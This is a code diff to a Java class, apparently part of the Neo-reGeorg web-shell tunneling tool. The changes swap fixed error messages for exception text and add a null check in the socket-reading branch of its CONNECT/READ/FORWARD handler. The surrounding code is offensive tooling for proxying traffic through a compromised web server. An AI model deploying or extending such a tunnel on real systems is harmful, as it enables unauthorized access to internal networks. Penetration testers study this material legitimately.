@@ -171,7 +171,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                         rinfo[STATUS] = "OK";
                     } catch (Exception e) {
                         rinfo[STATUS] = "FAIL";
-                        rinfo[ERROR] = "Failed connecting to target";
+                        rinfo[ERROR] = e.toString();
                     }
                 } else if (cmd.compareTo("DISCONNECT") == 0) {
                     SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
@@ -183,26 +183,29 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                 } else if (cmd.compareTo("READ") == 0){
                     SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
                     try{
-                        ByteBuffer buf = ByteBuffer.allocate(READBUF);
-                        int bytesRead = socketChannel.read(buf);
-                        int maxRead = MAXREADSIZE;
-                        int readLen = 0;
-                        ByteArrayOutputStream readData = new ByteArrayOutputStream();
-                        while (bytesRead > 0){
-                            byte[] block = new byte[bytesRead];
-                            System.arraycopy(buf.array(), 0, block, 0, bytesRead);
-                            readData.write(block);
-                            ((java.nio.Buffer)buf).clear();
-                            readLen += bytesRead;
-                            if (bytesRead < 513 || readLen >= maxRead) {
-                                rinfo[DATA] = readData.toByteArray();
-                                break;
+                        if ( socketChannel != null ) {
+                            ByteBuffer buf = ByteBuffer.allocate(READBUF);
+                            int bytesRead = socketChannel.read(buf);
+                            int maxRead = MAXREADSIZE;
+                            int readLen = 0;
+                            ByteArrayOutputStream readData = new ByteArrayOutputStream();
+                            while (bytesRead > 0){
+                                byte[] block = new byte[bytesRead];
+                                System.arraycopy(buf.array(), 0, block, 0, bytesRead);
+                                readData.write(block);
+                                ((java.nio.Buffer)buf).clear();
+                                readLen += bytesRead;
+                                if (bytesRead < 513 || readLen >= maxRead) {
+                                    rinfo[DATA] = readData.toByteArray();
+                                    break;
+                                }
+                                bytesRead = socketChannel.read(buf);
                             }
-                            bytesRead = socketChannel.read(buf);
                         }
                         rinfo[STATUS] = "OK";
                     } catch (Exception e) {
                         rinfo[STATUS] = "FAIL";
+                        rinfo[ERROR] = e.toString();
                     }
 
                 } else if (cmd.compareTo("FORWARD") == 0){
@@ -220,7 +223,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
 
                     } catch (Exception e) {
                         rinfo[STATUS] = "FAIL";
-                        rinfo[ERROR] = "POST request read filed";
+                        rinfo[ERROR] = e.toString();
                         socketChannel.socket().close();
                     }
                 }
